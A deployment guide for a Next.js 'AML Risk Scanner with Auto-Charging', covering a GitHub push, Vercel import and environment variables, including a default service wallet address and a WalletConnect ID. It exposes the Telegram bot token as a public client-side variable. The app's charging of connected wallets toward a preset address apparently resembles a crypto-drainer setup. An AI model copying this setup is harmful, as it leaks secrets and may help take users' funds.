# Deploying to Vercel - Step by Step

## Prerequisites

Before starting, you need:
- ✅ Vercel account (free or paid)
- ✅ GitHub/GitLab/Bitbucket account
- ✅ Your service wallet address (or use default)
- ✅ Telegram credentials (optional)

---

## Step 1: Prepare Your Code

### 1.1 Make Sure Everything is Working Locally

```bash
cd apps/web
npm run dev
```

Visit `http://localhost:3000` and verify it loads.

**Press Ctrl+C to stop the server**

### 1.2 Clean Up and Prepare

```bash
# From root directory
cd c:\Users\uwosk\Desktop\almriskscan

# Check git status
git status

# If you see "fatal: not a git repository", initialize git:
git init

# Add all files
git add .

# Commit
git commit -m "ALM Risk Scanner - Ready for Vercel deployment"
```

---

## Step 2: Push to GitHub (or GitLab/Bitbucket)

### 2.1 Create a GitHub Repository

1. Go to https://github.com/new
2. Create a new repository:
   - **Repository name:** almriskscan
   - **Description:** AML Risk Scanner with Auto-Charging
   - **Visibility:** Public or Private (your choice)
   - **Click:** Create repository

3. You'll see commands to push. Run these in your terminal:

```bash
# From your project root directory
git remote add origin https://github.com/YOUR_USERNAME/almriskscan.git
git branch -M main
git push -u origin main
```

Replace `YOUR_USERNAME` with your actual GitHub username.

### 2.2 Verify Push Succeeded

Go to your GitHub repository and verify you can see all the files.

---

## Step 3: Connect Vercel to GitHub

### 3.1 Go to Vercel Dashboard

1. Visit https://vercel.com/dashboard
2. Sign in with your Vercel account (or create one)

### 3.2 Import Project

1. Click **"Add New..."** button
2. Click **"Project"**
3. Under **"Import Git Repository"**, search for your repo:
   - Type: `almriskscan`
   - Select your repository when it appears

### 3.3 Configure Project

The import page will show:
- **Framework Preset:** Select "Next.js"
- **Root Directory:** Select `apps/web`
- **Build Command:** Should auto-fill with `npm run build`
- **Output Directory:** Should auto-fill with `.next`

---

## Step 4: Set Environment Variables

### 4.1 Go to Project Settings

In Vercel:
1. Go to your project
2. Click **Settings** (top menu)
3. Click **"Environment Variables"** (left sidebar)

### 4.2 Add Variables

Add each of these variables:

**1. Service Wallet Address**
- **Name:** `NEXT_PUBLIC_SERVICE_WALLET`
- **Value:** `0x1fC618a5B0AAFfC876b72288D71f3E80918c590f` (or your wallet)
- **Environments:** Select all (Production, Preview, Development)

**2. Telegram Bot Token**
- **Name:** `TELEGRAM_BOT_TOKEN`
- **Value:** Your bot token from @BotFather
- **Environments:** Select all

**3. Telegram Chat ID**
- **Name:** `TELEGRAM_CHAT_ID`
- **Value:** Your chat ID from @userinfobot
- **Environments:** Select all

**4. Public Telegram Bot Token**
- **Name:** `NEXT_PUBLIC_TELEGRAM_BOT_TOKEN`
- **Value:** Same as #2
- **Environments:** Select all

**5. Public Telegram Chat ID**
- **Name:** `NEXT_PUBLIC_TELEGRAM_CHAT_ID`
- **Value:** Same as #3
- **Environments:** Select all

**6. WalletConnect Project ID**
- **Name:** `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID`
- **Value:** `ec69905148aaa16f986896374d25cf53`
- **Environments:** Select all

---

## Step 5: Deploy

1. Click **"Deploy"** in Vercel.
2. Wait 2-5 minutes for the build to complete.
3. Access your deployment URL!
